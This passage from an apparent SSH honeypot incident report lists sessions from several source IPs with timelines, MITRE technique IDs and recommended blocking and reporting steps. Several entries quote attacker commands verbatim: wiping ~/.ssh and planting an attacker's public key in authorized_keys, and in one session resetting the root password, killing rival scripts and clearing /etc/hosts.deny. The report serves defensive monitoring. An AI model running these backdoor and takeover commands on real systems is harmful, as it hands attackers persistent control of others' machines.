| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:50:01` | `cowrie.session.connect` |
| `2026-06-12 18:50:01` | `cowrie.client.version` |
| `2026-06-12 18:50:01` | `cowrie.client.kex` |
| `2026-06-12 18:50:02` | `cowrie.login.success` |
| `2026-06-12 18:50:02` | `cowrie.session.params` |
| `2026-06-12 18:50:02` | `cowrie.command.input` |
| `2026-06-12 18:50:02` | `cowrie.command.failed` |
| `2026-06-12 18:50:03` | `cowrie.log.closed` |
| `2026-06-12 18:50:03` | `cowrie.session.params` |
| `2026-06-12 18:50:03` | `cowrie.command.input` |
| `2026-06-12 18:50:03` | `cowrie.session.file_download` |
| `2026-06-12 18:50:03` | `cowrie.log.closed` |
| `2026-06-12 18:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6455b8b0507

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 18:50 |
| **Last Seen** | 2026-06-12 18:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:50:06` | `cowrie.session.connect` |
| `2026-06-12 18:50:06` | `cowrie.client.version` |
| `2026-06-12 18:50:06` | `cowrie.client.kex` |
| `2026-06-12 18:50:07` | `cowrie.login.success` |
| `2026-06-12 18:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d6f6cbdf397

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 18:55 |
| **Last Seen** | 2026-06-12 18:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:55:21` | `cowrie.session.connect` |
| `2026-06-12 18:55:21` | `cowrie.client.version` |
| `2026-06-12 18:55:21` | `cowrie.client.kex` |
| `2026-06-12 18:55:21` | `cowrie.login.success` |
| `2026-06-12 18:55:22` | `cowrie.session.params` |
| `2026-06-12 18:55:22` | `cowrie.command.input` |
| `2026-06-12 18:55:22` | `cowrie.command.failed` |
| `2026-06-12 18:55:22` | `cowrie.log.closed` |
| `2026-06-12 18:55:22` | `cowrie.session.params` |
| `2026-06-12 18:55:22` | `cowrie.command.input` |
| `2026-06-12 18:55:22` | `cowrie.session.file_download` |
| `2026-06-12 18:55:22` | `cowrie.log.closed` |
| `2026-06-12 18:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88311d5b0bcd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 18:55 |
| **Last Seen** | 2026-06-12 18:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:55:24` | `cowrie.session.connect` |
| `2026-06-12 18:55:24` | `cowrie.client.version` |
| `2026-06-12 18:55:24` | `cowrie.client.kex` |
| `2026-06-12 18:55:25` | `cowrie.login.success` |
| `2026-06-12 18:55:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e38822c26638

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 18:55 |
| **Last Seen** | 2026-06-12 18:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:55:56` | `cowrie.session.connect` |
| `2026-06-12 18:55:56` | `cowrie.client.version` |
| `2026-06-12 18:55:56` | `cowrie.client.kex` |
| `2026-06-12 18:55:57` | `cowrie.login.success` |
| `2026-06-12 18:55:57` | `cowrie.session.params` |
| `2026-06-12 18:55:57` | `cowrie.command.input` |
| `2026-06-12 18:55:57` | `cowrie.command.failed` |
| `2026-06-12 18:55:58` | `cowrie.log.closed` |
| `2026-06-12 18:55:58` | `cowrie.session.params` |
| `2026-06-12 18:55:58` | `cowrie.command.input` |
| `2026-06-12 18:55:58` | `cowrie.session.file_download` |
| `2026-06-12 18:55:58` | `cowrie.log.closed` |
| `2026-06-12 18:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb2573d1e4e5

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 18:56 |
| **Last Seen** | 2026-06-12 18:56 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:56:02` | `cowrie.session.connect` |
| `2026-06-12 18:56:02` | `cowrie.client.version` |
| `2026-06-12 18:56:02` | `cowrie.client.kex` |
| `2026-06-12 18:56:03` | `cowrie.login.success` |
| `2026-06-12 18:56:03` | `cowrie.session.params` |
| `2026-06-12 18:56:03` | `cowrie.command.input` |
| `2026-06-12 18:56:03` | `cowrie.command.failed` |
| `2026-06-12 18:56:04` | `cowrie.log.closed` |
| `2026-06-12 18:56:04` | `cowrie.session.params` |
| `2026-06-12 18:56:04` | `cowrie.command.input` |
| `2026-06-12 18:56:04` | `cowrie.session.file_download` |
| `2026-06-12 18:56:04` | `cowrie.log.closed` |
| `2026-06-12 18:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b93050eab51

| Field | Detail |
|---|---|
| **Source IP** | `103.74.5[.]44` |
| **First Seen** | 2026-06-12 18:56 |
| **Last Seen** | 2026-06-12 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:56:03` | `cowrie.session.connect` |
| `2026-06-12 18:56:03` | `cowrie.client.version` |
| `2026-06-12 18:56:03` | `cowrie.client.kex` |
| `2026-06-12 18:56:03` | `cowrie.login.success` |
| `2026-06-12 18:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.74.5[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.74.5[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24e577ed9618

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 18:56 |
| **Last Seen** | 2026-06-12 18:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:56:07` | `cowrie.session.connect` |
| `2026-06-12 18:56:07` | `cowrie.client.version` |
| `2026-06-12 18:56:07` | `cowrie.client.kex` |
| `2026-06-12 18:56:08` | `cowrie.login.success` |
| `2026-06-12 18:56:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53be0b986945

| Field | Detail |
|---|---|
| **Source IP** | `42.180.132[.]32` |
| **First Seen** | 2026-06-12 18:56 |
| **Last Seen** | 2026-06-12 18:57 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:uY56Hco4tNTL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:56:58` | `cowrie.session.connect` |
| `2026-06-12 18:56:58` | `cowrie.client.version` |
| `2026-06-12 18:56:58` | `cowrie.client.kex` |
| `2026-06-12 18:56:59` | `cowrie.login.success` |
| `2026-06-12 18:56:59` | `cowrie.session.params` |
| `2026-06-12 18:56:59` | `cowrie.command.input` |
| `2026-06-12 18:56:59` | `cowrie.command.failed` |
| `2026-06-12 18:57:00` | `cowrie.log.closed` |
| `2026-06-12 18:57:00` | `cowrie.session.params` |
| `2026-06-12 18:57:00` | `cowrie.command.input` |
| `2026-06-12 18:57:00` | `cowrie.session.file_download` |
| `2026-06-12 18:57:00` | `cowrie.log.closed` |
| `2026-06-12 18:57:16` | `cowrie.session.params` |
| `2026-06-12 18:57:16` | `cowrie.command.input` |
| `2026-06-12 18:57:17` | `cowrie.log.closed` |
| `2026-06-12 18:57:17` | `cowrie.session.params` |
| `2026-06-12 18:57:17` | `cowrie.command.input` |
| `2026-06-12 18:57:17` | `cowrie.log.closed` |
| `2026-06-12 18:57:17` | `cowrie.session.params` |
| `2026-06-12 18:57:17` | `cowrie.command.input` |
| `2026-06-12 18:57:18` | `cowrie.session.file_download` |
| `2026-06-12 18:57:18` | `cowrie.log.closed` |
| `2026-06-12 18:57:18` | `cowrie.session.params` |
| `2026-06-12 18:57:18` | `cowrie.command.input` |
| `2026-06-12 18:57:18` | `cowrie.log.closed` |
| `2026-06-12 18:57:18` | `cowrie.session.params` |
| `2026-06-12 18:57:18` | `cowrie.command.input` |
| `2026-06-12 18:57:19` | `cowrie.log.closed` |
| `2026-06-12 18:57:19` | `cowrie.session.params` |
| `2026-06-12 18:57:19` | `cowrie.command.input` |
| `2026-06-12 18:57:19` | `cowrie.command.input` |
| `2026-06-12 18:57:19` | `cowrie.log.closed` |
| `2026-06-12 18:57:20` | `cowrie.session.params` |
| `2026-06-12 18:57:20` | `cowrie.command.input` |
| `2026-06-12 18:57:20` | `cowrie.log.closed` |
| `2026-06-12 18:57:20` | `cowrie.session.params` |
| `2026-06-12 18:57:20` | `cowrie.command.input` |
| `2026-06-12 18:57:20` | `cowrie.log.closed` |
| `2026-06-12 18:57:21` | `cowrie.session.params` |
| `2026-06-12 18:57:21` | `cowrie.command.input` |
| `2026-06-12 18:57:21` | `cowrie.log.closed` |
| `2026-06-12 18:57:21` | `cowrie.session.params` |
| `2026-06-12 18:57:21` | `cowrie.command.input` |
| `2026-06-12 18:57:21` | `cowrie.log.closed` |
| `2026-06-12 18:57:22` | `cowrie.session.params` |
| `2026-06-12 18:57:22` | `cowrie.command.input` |
| `2026-06-12 18:57:22` | `cowrie.log.closed` |
| `2026-06-12 18:57:22` | `cowrie.session.params` |
| `2026-06-12 18:57:22` | `cowrie.command.input` |
| `2026-06-12 18:57:22` | `cowrie.log.closed` |
| `2026-06-12 18:57:23` | `cowrie.session.params` |
| `2026-06-12 18:57:23` | `cowrie.command.input` |
| `2026-06-12 18:57:23` | `cowrie.log.closed` |
| `2026-06-12 18:57:23` | `cowrie.session.params` |
| `2026-06-12 18:57:23` | `cowrie.command.input` |
| `2026-06-12 18:57:24` | `cowrie.log.closed` |
| `2026-06-12 18:57:24` | `cowrie.session.params` |
| `2026-06-12 18:57:24` | `cowrie.command.input` |
| `2026-06-12 18:57:24` | `cowrie.log.closed` |
| `2026-06-12 18:57:24` | `cowrie.session.params` |
| `2026-06-12 18:57:24` | `cowrie.command.input` |
| `2026-06-12 18:57:24` | `cowrie.log.closed` |
| `2026-06-12 18:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.180.132[.]32` to AbuseIPDB if not already reported
- [ ] Block `42.180.132[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee3be79979ee

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 18:57 |
| **Last Seen** | 2026-06-12 18:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:57:03` | `cowrie.session.connect` |
| `2026-06-12 18:57:03` | `cowrie.client.version` |
| `2026-06-12 18:57:03` | `cowrie.client.kex` |
| `2026-06-12 18:57:03` | `cowrie.login.success` |
| `2026-06-12 18:57:04` | `cowrie.session.params` |
| `2026-06-12 18:57:04` | `cowrie.command.input` |
| `2026-06-12 18:57:04` | `cowrie.command.failed` |
| `2026-06-12 18:57:04` | `cowrie.log.closed` |
| `2026-06-12 18:57:04` | `cowrie.session.params` |
| `2026-06-12 18:57:04` | `cowrie.command.input` |
| `2026-06-12 18:57:04` | `cowrie.session.file_download` |
| `2026-06-12 18:57:04` | `cowrie.log.closed` |
| `2026-06-12 18:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcbab8910d2f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]200` |
| **First Seen** | 2026-06-12 18:57 |
| **Last Seen** | 2026-06-12 18:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:57:06` | `cowrie.session.connect` |
| `2026-06-12 18:57:06` | `cowrie.client.version` |
| `2026-06-12 18:57:06` | `cowrie.client.kex` |
| `2026-06-12 18:57:07` | `cowrie.login.success` |
| `2026-06-12 18:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]200` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]200` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6301b7bd9b64

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 18:58 |
| **Last Seen** | 2026-06-12 18:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:58:12` | `cowrie.session.connect` |
| `2026-06-12 18:58:12` | `cowrie.client.version` |
| `2026-06-12 18:58:12` | `cowrie.client.kex` |
| `2026-06-12 18:58:13` | `cowrie.login.success` |
| `2026-06-12 18:58:13` | `cowrie.session.params` |
| `2026-06-12 18:58:13` | `cowrie.command.input` |
| `2026-06-12 18:58:13` | `cowrie.command.failed` |
| `2026-06-12 18:58:14` | `cowrie.log.closed` |
| `2026-06-12 18:58:14` | `cowrie.session.params` |
| `2026-06-12 18:58:14` | `cowrie.command.input` |
| `2026-06-12 18:58:14` | `cowrie.session.file_download` |
| `2026-06-12 18:58:14` | `cowrie.log.closed` |
| `2026-06-12 18:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0327fa2b90bb

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 18:58 |
| **Last Seen** | 2026-06-12 18:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 18:58:17` | `cowrie.session.connect` |
| `2026-06-12 18:58:17` | `cowrie.client.version` |
| `2026-06-12 18:58:17` | `cowrie.client.kex` |
| `2026-06-12 18:58:18` | `cowrie.login.success` |
| `2026-06-12 18:58:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3820c41edaed

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:00 |
| **Last Seen** | 2026-06-12 19:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 19:00:19` | `cowrie.session.connect` |
| `2026-06-12 19:00:19` | `cowrie.client.version` |
| `2026-06-12 19:00:20` | `cowrie.client.kex` |
| `2026-06-12 19:00:20` | `cowrie.login.success` |
| `2026-06-12 19:00:21` | `cowrie.session.params` |
| `2026-06-12 19:00:21` | `cowrie.command.input` |
| `2026-06-12 19:00:21` | `cowrie.command.failed` |
| `2026-06-12 19:00:22` | `cowrie.log.closed` |
| `2026-06-12 19:00:22` | `cowrie.session.params` |
| `2026-06-12 19:00:22` | `cowrie.command.input` |
| `2026-06-12 19:00:22` | `cowrie.session.file_download` |
| `2026-06-12 19:00:22` | `cowrie.log.closed` |
| `2026-06-12 19:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.196.253[.]20` to AbuseIPDB if not already reported
- [ ] Block `196.196.253[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7213342f93e

| Field | Detail |
|---|---|
| **Source IP** | `196.196.253[.]20` |
| **First Seen** | 2026-06-12 19:00 |
| **Last Seen** | 2026-06-12 19:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
